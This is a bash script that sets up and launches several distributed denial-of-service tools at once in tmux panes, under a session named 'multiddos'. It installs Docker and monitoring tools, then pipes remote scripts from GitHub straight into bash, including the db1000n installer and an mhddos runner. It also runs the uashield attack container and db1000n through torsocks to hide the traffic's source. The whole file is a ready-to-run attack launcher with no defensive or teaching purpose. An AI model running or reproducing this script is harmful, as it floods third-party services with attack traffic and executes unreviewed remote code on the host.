#!/bin/bash
sudo apt-get update -y
sudo apt-get install -y tmux wget torsocks python3 python3-pip gcc libc-dev libffi-dev libssl-dev python3-dev rustc
pip install --upgrade pip
#install docker
sudo apt install -y apt-transport-https ca-certificates curl software-properties-common
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable"
sudo apt install docker-ce -y
    
if [ ! -f "/usr/local/bin/gotop" ]; then
    wget https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb
    sudo dpkg -i gotop_3.0.0_linux_amd64.deb
    rm gotop_3.0.0_linux_amd64.deb
fi

tmux kill-session -t multiddos
sudo pkill node
cd ~
rm -rf multiddos
mkdir multiddos
cd multiddos
curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash

tmux new-session -s multiddos -d 'gotop -asc solarized'
sleep 0.1
tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/KarboDuck/mhddos_bash/master/runner.sh | bash'
sleep 0.1
#tmux split-window -h -p 75 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh |  bash'
tmux split-window -v 'docker run -it --rm  ghcr.io/opengs/uashield:master 512 true'
sleep 0.1
tmux split-window -v 'torsocks -i ./db1000n'
#tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
tmux -2 attach-session -d
